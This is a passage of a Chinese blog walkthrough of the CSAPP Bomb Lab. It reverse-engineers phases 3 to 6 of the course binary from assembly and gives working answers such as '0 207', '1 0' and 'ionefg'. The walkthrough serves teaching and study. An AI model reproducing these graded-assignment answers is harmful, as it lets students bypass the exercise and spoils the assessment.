ret</code></pre><p>这一关的代码量比较大，但是中间一段看起来很有规律，尤其注意这一句：<code>jmp  *0x402470(, %rax, 8)</code>，直接根据 <code>%rax</code> 寄存器的值计算偏移量进行跳转，这便是 <strong>switch 语句</strong> 所采用的跳转方式，地址 <code>0x402470</code> 即跳转表的首地址。</p><p>另外，还需要关注的一条指令是 <code>call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;</code>，貌似是一个函数调用指令，以下是我借助大语言模型得到的解释：</p><blockquote><p><code>__isoc99_sscanf@plt</code> 是一个指向 <code>sscanf</code> 函数的 PLT（Procedure Linkage Table）入口点的符号引用。<code>sscanf</code> 函数是 C 语言标准库中的一个函数，用于从输入流中按照指定格式读取数据。<code>@plt</code> 表示这是一个通过动态链接的程序跳转表（Procedure Linkage Table）来调用的函数。</p><h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><p>在 x86-64 架构中，函数参数通常是通过寄存器传递的。对于 <code>sscanf</code> 函数，它的参数如下：</p><ul><li><code>%rdi</code>：第一个参数，通常是文件描述符或指针类型。对于 <code>sscanf</code>，这是指向输入字符串的指针。</li><li><code>%rsi</code>：第二个参数，指向格式化字符串的指针。</li><li><code>%rdx</code>：第三个参数，如果有的话，指向第一个要填充的变量的地址。</li><li>更多的参数会继续使用后续的寄存器 <code>%rcx</code>, <code>%r8</code>, 和 <code>%r9</code>。如果参数超过六个，那么它们将会通过栈传递。</li></ul><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>在 x86-64 架构中，返回值会被放在 <code>%rax</code> 寄存器中。<code>sscanf</code> 返回成功匹配和赋值的项数，如果没有任何匹配，则返回零。如果输入结束前格式化字符串就被耗尽了，也返回零。如果遇到任何读取错误（如读取一个整数但输入不是有效的整数），则返回负数。</p></blockquote><p>简而言之，<code>sscanf</code> 类似于 <code>scanf</code>，只是输入从标准输入变成了指定的字符串。在这里，<code>sscanf</code> 指定了 4 个参数，作用为：从 <code>%rdi</code> 寄存器指向的字符串中进行读取，<code>%rsi</code> 指向格式化字符串，<code>%rdx</code> 和 <code>%rcx</code> 分别指向被格式化读取到的变量 1 和变量 2. 若读取成功，则返回成功读取的项数，即为 2，存入 <code>%rax</code> 寄存器中。</p><p>查看 <code>0x4025cf</code> 处的字符串，即格式化字符串，为 <code>%d %d</code>，说明读取的两个值都为十进制整数，即本关密码的形式。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p3.png" alt></p><p>最后查看一下整张跳转表的值，根据最终跳转到的位置确定输入的值。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p3-2.png" alt></p><p>然后将其改写为 switch 语句，下面直接给出完整代码的翻译结果：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rcx &#x3D; %rsp + 12;%rdx &#x3D; %rsp + 8;%esi &#x3D; 0x4025cf;%eax &#x3D; 0;sscanf(%rdi, %rsi, %rdx, %rcx);if (%eax &lt;&#x3D; 1) &#123;          &#x2F;&#x2F; 读取成功的值个数小于2    explode_bomb();&#125;if (Mem[%rsp + 8] &gt; 7u) &#123; &#x2F;&#x2F; 读取到的（输入的）第一个值大于7或小于0    explode_bomb();&#125;%eax &#x3D; Mem[%rsp + 8];switch (%rax) &#123;    case 0:        %eax &#x3D; 0xcf;  break;    case 1:        %eax &#x3D; 0x137; break;    case 2:        %eax &#x3D; 0x2c3; break;    case 3:        %eax &#x3D; 0x100; break;    case 4:        %eax &#x3D; 0x185; break;    case 5:        %eax &#x3D; 0xce;  break;    case 6:        %eax &#x3D; 0x2aa; break;    case 7:    %eax &#x3D; 0x147; break;&#125;&#x2F;&#x2F; 输入的第二个值等于%eax寄存器的值if (%eax !&#x3D; Mem[%rsp + 12]) &#123;    explode_bomb();&#125;</code></pre><p>要使得 <code>%eax</code> 的值等于输入的第二个值，只需要保证输入的第一个值经过 switch 语句选择之后，赋值正好等于输入的第二个值。</p><p>因此本关的答案并不是固定的，<code>0 207</code>、 <code>3 256</code> 等等都是正确答案。注意不能写成 <code>0 0xcf</code>、<code>3 0x100</code>，因为输入格式为十进制整数，需要将十六进制进行转换。</p><h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax0x0000000000401024 &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp)0x0000000000401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt;0x0000000000401035 &lt;+41&gt;:    call   0x40143a &lt;explode_bomb&gt;0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi0x0000000000401048 &lt;+60&gt;:    call   0x400fce &lt;func4&gt;0x000000000040104d &lt;+65&gt;:    test   %eax,%eax0x000000000040104f &lt;+67&gt;:    jne    0x401058 &lt;phase_4+76&gt;0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp)0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;0x0000000000401058 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp0x0000000000401061 &lt;+85&gt;:    ret</code></pre><p>这一关主要分成两个函数：phase_4 和 func_4，首先查看 phase_4，代码前一段和 phase_3 非常类似：读取两个整数，且保证输入的第一个值位于区间 <code>[0, 15)</code> 内。</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rcx &#x3D; %rsp + 12;%rdx &#x3D; %rsp + 8;%esi &#x3D; 0x4025cf;%eax &#x3D; 0;sscanf(%rdi, %rsi, %rdx, %rcx);if (%eax !&#x3D; 2) &#123;    explode_bomb();&#125;if (Mem[%rsp + 8] &gt;&#x3D; 15u) &#123;explode_bomb();&#125;%edx &#x3D; 0xe;%esi &#x3D; 0;%edi &#x3D; Mem[%rsp + 8];func4(%rdi, %rsi, %rdx); &#x2F;&#x2F; func4(Mem[%rsp+8], 0, 14)if (%eax !&#x3D; 0) &#123;    explode_bomb();&#125;if (Mem[%rsp + 12] !&#x3D; 0) &#123;    explode_bomb();&#125;</code></pre><p>后一段便是传递 3 个参数给函数 func_4 进行调用，需要保证返回值和输入的第二个数为 0，因此密码的第二个数为 0。可以看到，phase_4 的代码结构还是很简单易懂的，关键是对 func_4 函数的分析。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax0x0000000000400fdd &lt;+15&gt;:    sar    %eax0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx0x0000000000400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt;0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx0x0000000000400fe9 &lt;+27&gt;:    call   0x400fce &lt;func4&gt;0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax0x0000000000400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx0x0000000000400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt;0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi0x0000000000400ffe &lt;+48&gt;:    call   0x400fce &lt;func4&gt;0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp0x000000000040100b &lt;+61&gt;:    ret</code></pre><p>仔细观察 func_4 的代码，发现含有对 func_4 的调用，因此 func_4 是一个 <strong>递归</strong> 函数。在对递归函数进行翻译时，本质上与普通的函数并没有区别，结果如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func4</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> c <span class="token operator">-</span> b<span class="token punctuation">;</span>    <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span>res <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">;</span>    res <span class="token operator">+=</span> temp<span class="token punctuation">;</span>    res <span class="token operator">>>=</span> <span class="token number">1</span><span class="token punctuation">;</span>    temp <span class="token operator">=</span> b <span class="token operator">+</span> res<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">></span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        c <span class="token operator">=</span> temp <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        res <span class="token operator">=</span> <span class="token function">func4</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>        res <span class="token operator">*=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">&lt;</span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            b <span class="token operator">=</span> temp <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            res <span class="token operator">=</span> <span class="token function">func4</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>            res <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> res <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>可以看到，程序的逻辑还是比较复杂的，但是注意到参数 b 和 c 的值都是确定的，真正的变量只有参数 a。因此这里有一个偷懒的办法：将程序翻译为一个语法严格正确的高级语言程序（而不是之前的伪代码），然后枚举所有可能的 a（只有 15 中情况），运行测试即可，结果为 0 的即为满足要求的值，也就是密码的第一个数。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p4.png" alt></p><p>可见，本关的正解同样不止一个，<code>1 0</code>、<code>3 0</code>、<code>7 0</code> 都是正确答案。</p><h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401062 &lt;+0&gt;:     push   %rbx0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax0x000000000040107a &lt;+24&gt;:    call   0x40131b &lt;string_length&gt;0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;0x0000000000401084 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi0x00000000004010bd &lt;+91&gt;:    call   0x401338 &lt;strings_not_equal&gt;0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;0x00000000004010c6 &lt;+100&gt;:   call   0x40143a &lt;explode_bomb&gt;0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;0x00000000004010e9 &lt;+135&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp0x00000000004010f2 &lt;+144&gt;:   pop    %rbx0x00000000004010f3 &lt;+145&gt;:   ret</code></pre><p>这一关的汇编代码逻辑不算复杂，我们主要关注翻译后的代码：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rbx &#x3D; %rdi;Mem[%rsp + 0x18] &#x3D; Mem[%fs + 0x28]; &#x2F;&#x2F; 4Byte%eax ^&#x3D; %eax;  &#x2F;&#x2F; %eax &#x3D; 0if (string_length() !&#x3D; 6) &#123;explode_bomb();&#125;for (%eax &#x3D; 0; %eax !&#x3D; 6; ++%eax) &#123;    %edx &#x3D; Mem[%rbx + %rax] &amp; 0xf;    Mem[%rsp + %rax + 0x10] &#x3D; Mem[0x4024b0 + %rdx]; &#x2F;&#x2F; 1Byte&#125;Mem[%rsp + 0x16] &#x3D; 0;%esi &#x3D; 0x40245e;%rdi &#x3D; %rsp + 0x10;if (string_not_equal(%rdi, %esi) !&#x3D; 0) &#123;explode_bomb();&#125;%rax &#x3D; Mem[%rsp + 0x18] ^ Mem[%fs + 0x28];if (%rax !&#x3D; 0) &#123;__stack_chk_fail();&#125;</code></pre><p>从 <code>if (string_length() != 6) explode_bomb();</code> 可以看出密码是一个长度为 6 的字符串，随后的 <code>for</code> 循环遍历字符串的各个字符，提取低一字节的值 <code>%edx</code>，将其作为相对于地址 <code>0x4024b0</code> 的偏移量，读取目标地址 <code>0x4020b0 + %rdx</code> 处的低 4 位数据，存入地址 <code>%rsp + %rax + 0x10</code> 处，构造出一个起始地址为 <code>%rsp + 0x10</code> 的长度为 6 的字符串。然后将起始地址为 <code>%rsp + 0x10</code> 的字符串与起始地址为 <code>0x40245e</code> 的字符串作比较，如果不相同，则“引爆炸弹”。最后进行缓冲区溢出检测，如果溢出，则调用 <code>__stack_chk_fail()</code>.</p><p>经过以上的描述，不难看出输入的 6 位字符串其实是一个相对于数组 <code>0x4024b0</code> 的索引，只不过索引值不直接给出，而是等于字符的低 4 位值。本关的目标便是使得输入的 6 位索引经过映射之后得到的字符串正好等于地址 <code>0x40245e</code> 的字符串，即 \”flyers\”.</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p5.png" alt></p><p>以字符 <em>f</em> 为例，<em>f</em> 在 array 表中的（最小）索引为 9，而所有低 4 位等于 9（1001）的字符都满足条件，例如 <em>i</em> .</p><div class="table-container"><table><thead><tr><th style="text-align:center">字符c1</th><th style="text-align:center">索引</th><th style="text-align:center">字符c2</th></tr></thead><tbody><tr><td style="text-align:center">f</td><td style="text-align:center">9</td><td style="text-align:center">i</td></tr><tr><td style="text-align:center">l</td><td style="text-align:center">15</td><td style="text-align:center">o</td></tr><tr><td style="text-align:center">y</td><td style="text-align:center">14</td><td style="text-align:center">n</td></tr><tr><td style="text-align:center">e</td><td style="text-align:center">5</td><td style="text-align:center">e</td></tr><tr><td style="text-align:center">r</td><td style="text-align:center">6</td><td style="text-align:center">f</td></tr><tr><td style="text-align:center">s</td><td style="text-align:center">7</td><td style="text-align:center">g</td></tr></tbody></table></div><p>依次类推，一个满足条件的密码为：<em>ionefg</em> .</p><h1 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h1><p>最复杂的一关，代码量非常大，而且逻辑比较复杂，整体观察比较困难，可以先将代码按照循环块拆分为几个部分，依次进行分析。</p><p>在使用 GDB 调试的时候，可以为每个块的起始部分分别打上断点，同时为了调试的方便，可将这些命令写入 <code>.gdbinit</code> 中。</p><pre class="language-shell" data-language="shell"><code class="language-shell">b phase_6b *0x401153b *0x40116fb *0x4011abb *0x4011d2r .&#x2F;ans.txt</code></pre><h2 id="block-1"><a href="#block-1" class="headerlink" title="block_1"></a>block_1</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004010f4 &lt;+0&gt;:     push   %r140x00000000004010f6 &lt;+2&gt;:     push   %r130x00000000004010f8 &lt;+4&gt;:     push   %r120x00000000004010fa &lt;+6&gt;:     push   %rbp0x00000000004010fb &lt;+7&gt;:     push   %rbx0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r130x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi0x0000000000401106 &lt;+18&gt;:    call   0x40145c &lt;read_six_numbers&gt;0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r140x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt;0x0000000000401123 &lt;+47&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt;0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;0x0000000000401140 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;0x000000000040114d &lt;+89&gt;:    add    $0x4,%r130x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;</code></pre><p>第一部分整体而言不算太复杂，直接查看翻译后的代码：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; 读取6个4Byte数字放入从%r14寄存器指向地址开始的内存空间中%r13 &#x3D; %rsp;%rsi &#x3D; %rsp;read_six_numbers();%r14 &#x3D; %rsp;for (%r12d &#x3D; 0; %r12 !&#x3D; 6; ) &#123;%rbp &#x3D; %r13;    %eax &#x3D; Mem[%r13];    %eax -&#x3D; 1;    if (%eax &gt; 5u) &#123;        explode_bomb();    &#125;    %r12d +&#x3D; 1;    if (%r12d &#x3D;&#x3D; 6) break;    for (%ebx &#x3D; %r12d; %ebx &lt;&#x3D; 5; ++%ebx) &#123;        %rax &#x3D; %ebx;  &#x2F;&#x2F; 符号扩展        %eax &#x3D; Mem[4 * %rax + %rsp];        if (Mem[%rbp] &#x3D;&#x3D; %eax) &#123;            explode_bomb();        &#125;&#125;%r13 +&#x3D; 4;&#125;</code></pre><p>与 phase_2 类似，首先读取 6 个数字，确定密码由 6 个数字组成。</p><p>随后主要关注循环中导致触发 <code>explode_bomb</code> 的条件，这些条件指明了密码的限定范围。第一个是 <code>%eax &gt; 5u</code>，注意前一条指令是 <code>%eax</code> 自减一，因此可以确定 6 个数字的范围都是 <code>[1, 6]</code>.</p><blockquote><p>这里自减一很有意思，刚开始看可能以为是多此一举，直接判断 %eax 是否大于 6u 不就完了吗？但是考虑到 0 这个特例，它在自减一后得到 -1，而 -1 满足无符号比较大于 5u，因此被排除在外。如果直接判断 %eax 是否大于 6u，那么数字的限定范围就变成了 [0, 6].</p></blockquote><p>后面的内层循环不难看出是用来判重的，因此六个数字的范围得以确定：每个数字都位于区间 <code>[1, 6]</code> 内且无重复数字。</p><h2 id="block-2"><a href="#block-2" class="headerlink" title="block_2"></a>block_2</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; %r14 &#x3D; %rsp&#x2F;&#x2F; 遍历6个数字，每个数字num的值变为7-num%ecx &#x3D; 7;for (%rax &#x3D; %r14, %rsi &#x3D; %rsp + 0x18; %rax !&#x3D; %rsi; %rax +&#x3D; 4) &#123;%edx &#x3D; %ecx - Mem[%rax];Mem[%rax] &#x3D; %edx;&#125;</code></pre><p>第二部分非常简单，遍历输入的 6 个数字，将每个数字 num 更改为 7 - num.</p><h2 id="block-3"><a href="#block-3" class="headerlink" title="block_3"></a>block_3</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt;0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;</code></pre><p>第三部分虽然代码量不大，但是跳转语句很多，逻辑非常复杂。这里我采用了分部的方式，首先改写为带 goto 语句的高级语言伪代码：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%esi &#x3D; 0;goto phase_6_163;phase_6_130:%rdx &#x3D; Mem[%rdx + 0x8];%eax +&#x3D; 1;if (%eax !&#x3D; %ecx) goto phase_6_130;goto phase_6_148;phase_6_143:%edx &#x3D; 0x6032d0;phase_6_148:Mem[%rsp + 2 * %rsi + 0x20] &#x3D; %rdx;%rsi +&#x3D; 4;if (%rsi &#x3D;&#x3D; 0x18) goto phase_6_183;phase_6_163:%ecx &#x3D; Mem[%rsp + %rsi];if (%ecx &lt;&#x3D; 1) goto phase_6_143;%eax &#x3D; 1;%edx &#x3D; 0x6032d0;goto phase_6_130;</code></pre><p>然后对照一些常见的形式 goto 改写为循环语句，这里的翻译过程比较繁琐，需要静下来仔细思考。</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%esi &#x3D; 0;while (%rsi !&#x3D; 0x18) &#123;%ecx &#x3D; Mem[%rsp + %rsi];if (%ecx &gt; 1) &#123;%eax &#x3D; 1;%rdx &#x3D; 0x6032d0;while (%eax !&#x3D; %ecx) &#123;%rdx &#x3D; Mem[%rdx + 0x8];%eax +&#x3D; 1;&#125;&#125;else &#123;%edx &#x3D; 0x6032d0;&#125;Mem[%rsp + 2 * %rsi + 0x20] &#x3D; %rdx;%rsi +&#x3D; 4;&#125;</code></pre><p>观察翻译后的代码，似乎和 phase_5 类似，遍历每个数字，并将每个数字当作索引 i，在起始地址为 <code>0x6032d0</code> 的表中查找第 i 个元素，以 <code>%rsp + 0x20</code> 作为起始地址创建一个线性结构。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p6.png" alt></p><p>打印起始地址为 <code>0x6032d0</code> 的 12 个 8 字节数据，可以看到第二列中表示的值就是某一行的地址，且这些地址正好可以串联成一个线性结构，加上符号名 \”node\” 的提示，是不是很熟悉？没错，就是 <strong>链表</strong> 。上图每一行的第一列为值域，第二列为 next 域。</p><p>回过来观察代码，第三部分的作用就是将输入的六个数字作为索引，创建一个数组，每个数组元素都为索引对应的 next 域。</p><h2 id="block-4"><a href="#block-4" class="headerlink" title="block_4"></a>block_4</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; 创建链表%rbx &#x3D; Mem[%rsp + 0x20];for (%rax &#x3D; %rsp + 0x28, %rsi &#x3D; %rsp + 0x50; ; %rcx &#x3D; %rdx) &#123;%rcx &#x3D; %rbx;%rdx &#x3D; Mem[%rax];Mem[%rcx + 8] &#x3D; %rdx;%rax +&#x3D; 8;if (%rax &#x3D;&#x3D; %rsi) break;&#125;</code></pre><p>理解清楚了第三部分，第四部分的作用就很明显了：根据第三部分创建的由 next 域构成的数组，创建一个链表结构。</p><h2 id="block-5"><a href="#block-5" class="headerlink" title="block_5"></a>block_5</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;0x00000000004011e9 &lt;+245&gt;:   call   0x40143a &lt;explode_bomb&gt;0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp0x00000000004011fb &lt;+263&gt;:   pop    %rbx0x00000000004011fc 